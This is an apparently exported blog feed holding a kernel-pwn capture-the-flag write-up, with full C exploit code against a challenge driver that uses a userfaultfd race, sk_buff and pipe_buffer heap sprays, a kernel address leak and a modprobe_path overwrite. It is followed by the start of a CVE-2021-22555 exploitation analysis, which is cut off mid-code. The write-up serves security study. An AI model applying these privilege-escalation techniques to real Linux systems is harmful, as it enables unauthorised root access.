class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> idx, <span class="keyword">unsigned</span> <span class="keyword">long</span> size, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">edit_arg</span> <span class="title">arg</span>;</span></span><br><span class="line">    arg.idx = idx;</span><br><span class="line">    arg.size = size;</span><br><span class="line">    arg.buf = buf;</span><br><span class="line">    <span class="keyword">return</span> ioctl(fd, <span class="number">0x50</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_mod</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;mkdir -p /tmp&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/copy.sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xFF\\xFF\\xFF\\xFF&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> pipe_fd2[PIPE_NUM2][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">char</span> sk_buf[<span class="number">704</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *pointer_buf;</span><br><span class="line">    <span class="keyword">char</span> *flag[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">int</span> flag_fd;</span><br><span class="line"></span><br><span class="line">    prepare_mod();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd2[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write something to activate it</span></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd2[i][<span class="number">1</span>], <span class="string">&quot;7777pray&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] open 0 kernelpwn error!%d\n&quot;</span>, fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    add(buf);</span><br><span class="line">    RegisterUserfault(page, edit_handle);</span><br><span class="line">    <span class="keyword">clock_t</span> <span class="keyword">start_t</span>, <span class="keyword">finish_t</span>;</span><br><span class="line">    <span class="keyword">start_t</span> = clock();</span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&#x27;[-] fork error!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] Child process sleeping now...&quot;</span>);</span><br><span class="line">        del(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] Child process started.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[\033[34m\033[1m*\033[0m] trapped in userfaultfd&quot;</span>);</span><br><span class="line">        edit(<span class="number">0</span>, <span class="number">0x202</span>, page);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finish_t</span> = clock() - <span class="keyword">start_t</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap:%d\n&quot;</span>, <span class="keyword">finish_t</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sk_buf, <span class="number">0</span>, <span class="number">704</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spray sk_buff success&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create pipe!&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;196082&quot;</span>, <span class="number">6</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to write the pipe!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] spray pipe_buffer success&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (struct pipe_buffer *)&amp;sk_buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], &amp;sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[*] read success!&quot;</span>);</span><br><span class="line">            <span class="comment">// print_hex(sk_buf, 0x2c0);</span></span><br><span class="line">            <span class="keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="number">0xffffffff81000000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] got pipe_buf_ops: \033[0m%p\n&quot;</span>,</span><br><span class="line">                       pipe_buf_ptr-&gt;ops);</span><br><span class="line">                kernel_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)pipe_buf_ptr-&gt;ops;</span><br><span class="line">                kernel_base = (kernel_addr - <span class="number">0x103ed80</span>);</span><br><span class="line">                kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (kernel_addr == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] leak error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%p \033[32m\033[1moffset: \033[0m%p\n&quot;</span>,</span><br><span class="line">           kernel_base, kernel_offset);</span><br><span class="line">    modprobe_path = kernel_offset + <span class="number">0xffffffff82a6c000</span> - <span class="number">0xe0</span>;</span><br><span class="line">    add(buf);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)((<span class="keyword">char</span> *)buf + <span class="number">0x200</span>) = modprobe_path;</span><br><span class="line">    edit(<span class="number">0</span>, <span class="number">0x300</span>, buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[<span class="number">0</span>][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(sk_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(sk_buf));</span><br><span class="line">    pointer_buf = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;sk_buf;</span><br><span class="line">    pointer_buf[<span class="number">0</span>] = kernel_offset + <span class="number">0xffffffff82382ba7</span>;</span><br><span class="line">    pointer_buf[<span class="number">1</span>] = kernel_offset + <span class="number">0xffffffff82382bae</span>;</span><br><span class="line">    pointer_buf[<span class="number">2</span>] = kernel_offset + <span class="number">0xffffffff823a20e0</span>;</span><br><span class="line">    pointer_buf[<span class="number">4</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">5</span>] = <span class="number">0xa</span>;</span><br><span class="line">    pointer_buf[<span class="number">12</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">13</span>] = <span class="number">0xa</span>;</span><br><span class="line">    pointer_buf[<span class="number">20</span>] = <span class="number">0x000004e200000000</span>;</span><br><span class="line">    pointer_buf[<span class="number">21</span>] = <span class="number">0xa</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(sk_buf + <span class="number">0xe0</span>, <span class="string">&quot;/tmp/copy.sh&quot;</span>);</span><br><span class="line">    pointer_buf[<span class="number">61</span>] = kernel_offset + <span class="number">0xffffffff82a6c108</span>;</span><br><span class="line">    pointer_buf[<span class="number">62</span>] = kernel_offset + <span class="number">0xffffffff82a6c108</span>;</span><br><span class="line">    pointer_buf[<span class="number">63</span>] = <span class="number">0x32</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(sk_sockets[<span class="number">0</span>][<span class="number">0</span>], sk_buf, <span class="keyword">sizeof</span>(sk_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] modprobe_path addr=&gt;%p\n&quot;</span>, modprobe_path + <span class="number">0xe0</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM2; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd2[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd2[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy&quot;</span>);</span><br><span class="line">    flag_fd = open(<span class="string">&quot;/tmp/myflag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (flag_fd &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;FAILED to hijack!&quot;</span>);</span><br><span class="line">    read(flag_fd, flag, <span class="number">0x100</span>);</span><br><span class="line">    write(<span class="number">1</span>, flag, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// del(0);</span></span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20220922173328405.png"                      alt="image-20220922173328405"                ></p><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>根据exp可以可能会存在以这样一个疑问：为什么开始要申请16个pipe_buffer结构体？</p><p>上面这个问题我依稀记得我在某篇文章提到过，不过我也没找到，所以这里再做一下解释。在最后利用时我们就已经破坏掉了slab的freelist链表了，但是系统会继续申请很多堆块，所以我们所做的算是保证在申请0x400size的object的时候不会发生kernel panic。</p><hr><p>题目链接：<a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/cactus.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; cl</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="sk_buff" scheme="https://cv196082.gitee.io/tags/sk-buff/"/>
    
    <category term="pipe_buffer" scheme="https://cv196082.gitee.io/tags/pipe-buffer/"/>
    
    <category term="userfaultfd" scheme="https://cv196082.gitee.io/tags/userfaultfd/"/>
    
    <category term="modprobe_path" scheme="https://cv196082.gitee.io/tags/modprobe-path/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-22555利用方法分析</title>
    <link href="https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/"/>
    <id>https://cv196082.gitee.io/2022/09/20/CVE-2021-22555%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%88%86%E6%9E%90/</id>
    <published>2022-09-20T14:41:14.000Z</published>
    <updated>2022-11-22T09:04:55.499Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在上一篇文章d3kheap中提到还有另外一种解决办法就是利用这一CVE进行利用，所以这一篇依旧使用d3kheap来进行复现。不过这里首先提一下这个CVE原本的漏洞。</p><p>在原本的CVE中漏洞点是<code>net/netfilter/x_tables.c</code> 中 <code>Netfilter</code> 模块的<code>ip_tables</code>子模块， 当调用<code>setsockopt()</code>和选项<code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>）时，内核结构需要从32位转换为64位，由于错误计算转换大小，导致在调用 xt_compat_match_from_user() 函数时堆溢出写 0。</p><p>这里利用这一漏洞的方法是，首先我们需要在msg_queue中存放两个msg_msg，分为一个主消息(0x1000)和一个辅助消息(0x400)。利用两个字节的溢出覆盖掉其中某一个主消息<code>msg_msg-&gt;m_list-&gt;next</code>指针，使两个msg_msg主消息指向同一个辅助消息，进而转化为UAF漏洞。后续的利用会在d3kheap题目提到这里就不再赘述了。</p><h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><p>因为我们这里相较于原本的CVE中可以更为简单的形成uaf，所以我们只需要考虑如何使用结构体即可。我们顺理成章的选择与原CVE相同的msg_msg建立主从消息队列</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/ViAM3gDxpl1kQj9.png"                                     ></p><p>为了方便后续的利用我们主从消息堆块的size分别选择96和1024。</p><p>此时我们可以利用d3kheap的功能造成UAF，但是我们仍然可以通过其中一个消息队列访问这个已经进入freelist的msg_msg，所以现在我们需要定位这一个msg_queue</p><h3 id="定位msg-queue"><a href="#定位msg-queue" class="headerlink" title="定位msg_queue"></a>定位msg_queue</h3><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/sCflaOFvMSzhGUV.png"                                     ></p><p>这里是目前内存中主从形式，这里我们使用<code>sk_buff</code>堆喷来定位这个free了的msg_msg结构体，该结构体类似于 <code>msg_msg</code>，其同样可以提供近乎任意大小对象的分配写入与释放，但不同的是 <code>msg_msg</code> 由一个 header 加上用户数据组成，而 <code>sk_buff</code> 本身不包含任何用户数据，用户数据单独存放在一个 object 当中，而 sk_buff 中存放指向用户数据的指针，并且存放用户数据的object只有0x140存放着一些指针，所以在这道题目里我们进行堆喷时write的大小为<code>0x2c0</code>。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/AV8HsnZj2bUCl4J.png"                                     ></p><p>至于这个结构体的分配与释放也是十分简单，sk_buff 在内核网络协议栈中代表一个「包」，我们不难想到的是我们只需要创建一对 socket，在上面发送与接收数据包就能完成 sk_buff 的分配与释放，最简单的办法便是用 socketpair 系统调用创建一对 socket，之后对其 read &amp; write 便能完成收发包的工作。</p><p>根据前一篇的思路，我们使用msgrcv时还是会使用MSG_COPY标识位。但是我们到底如何判断呢？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">if</span> (!IS_ERR(msg)) &#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Found a suitable message.</span></span><br><span class="line"><span class="comment">         * Unlink it from the queue.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">if</span> ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) &#123;</span><br><span class="line">      msg = ERR_PTR(-E2BIG);</span><br><span class="line">      <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment">         * not update queue parameters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    <span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">      msg = copy_msg(msg, copy);</span><br><span class="line">      <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    msq-&gt;q_qnum--;</span><br><span class="line">    msq-&gt;q_rtime = ktime_get_real_seconds();</span><br><span class="line">    ipc_update_pid(&amp;msq-&gt;q_lrpid, task_tgid(current));</span><br><span class="line">    msq-&gt;q_cbytes -= msg-&gt;m_ts;</span><br><span class="line">    atomic_sub(msg-&gt;m_ts, &amp;ns-&gt;msg_bytes);</span><br><span class="line">    atomic_dec(&amp;ns-&gt;msg_hdrs);</span><br><span class="line">    ss_wakeup(msq, &amp;wake_q, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">out_unlock0:</span><br><span class="line">  ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">  wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里如果我们传入的bufsz小于<code>msg-&gt;m_ts</code>就会给msg赋值一个负值，然后在后面return出来。不过这里在使用msgrcv函数时需要注意的还有msgtyp这个参数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct msg_msg *<span class="title">find_msg</span><span class="params">(struct msg_queue *msq, <span class="keyword">long</span> *msgtyp, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>, *<span class="title">found</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">long</span> count = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(msg, &amp;msq-&gt;q_messages, m_list) &#123;</span><br><span class="line"><span class="keyword">if</span> (testmsg(msg, *msgtyp, mode) &amp;&amp;</span><br><span class="line">    !security_msg_queue_msgrcv(&amp;msq-&gt;q_perm, msg, current,</span><br><span class="line">       *msgtyp, mode)) &#123;</span><br><span class="line"><span class="keyword">if</span> (mode == SEARCH_LESSEQUAL &amp;&amp; msg-&gt;m_type != <span class="number">1</span>) &#123;</span><br><span class="line">*msgtyp = msg-&gt;m_type - <span class="number">1</span>;</span><br><span class="line">found = msg;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (mode == SEARCH_NUMBER) &#123;</span><br><span class="line"><span class="keyword">if</span> (*msgtyp == count)</span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> found ?: ERR_PTR(-EAGAIN);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过阅读其他源码可以看到mode是等于SEARCH_NUMBER的，所以这里会判断msgtyp和count的值，如果我们仍然想上一篇文章那样传入0，就只会读取msg_queue中的第一个msg_msg也就是我们的主消息，不过我们真正需要的辅助消息，所以这里我们还需要把传入的msgtyp修改为1才能获取到我们的目标object。</p><p>所以我们可以控制<code>msg-&gt;m_ts</code>然后控制传入的msgtyp以及bufsz就可以出现报错，不过这里仍然不会出现kernel panic，所以我们可以此种办法定位哪一个meg_queue中的辅助消息为我们的UAF的msg_msg。</p><h3 id="泄漏堆地址"><a href="#泄漏堆地址" class="headerlink" title="泄漏堆地址"></a>泄漏堆地址</h3><p>这里泄漏堆地址的方式其实跟上一篇文章一致的，首先通过越界读取相邻辅助消息堆块的指针，并且此时的辅助消息<code>msg_msg-&gt;m_list.next</code>指向的是msg_queue而<code>msg_msg-&gt;m_list.prev</code>指向的是主消息的地址。一样的主消息<code>msg-&gt;m_list.next</code>指向的是辅助堆块，那么对我们来说就可以通过两次读取泄漏出我们UAF堆块的地址。</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/wjzFeZiDUpxXVKJ.png"                                     ></p><p>不过这里的前提是和上一篇文章一样那就是存在相邻的辅助堆块也就是堆块分配在同一页内存上。</p><h3 id="泄漏基地址"><a href="#泄漏基地址" class="headerlink" title="泄漏基地址"></a>泄漏基地址</h3><p>这里泄漏基地址的方法和前面的方法就完全不一样了，这里使用pipe_buffer来泄漏。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span 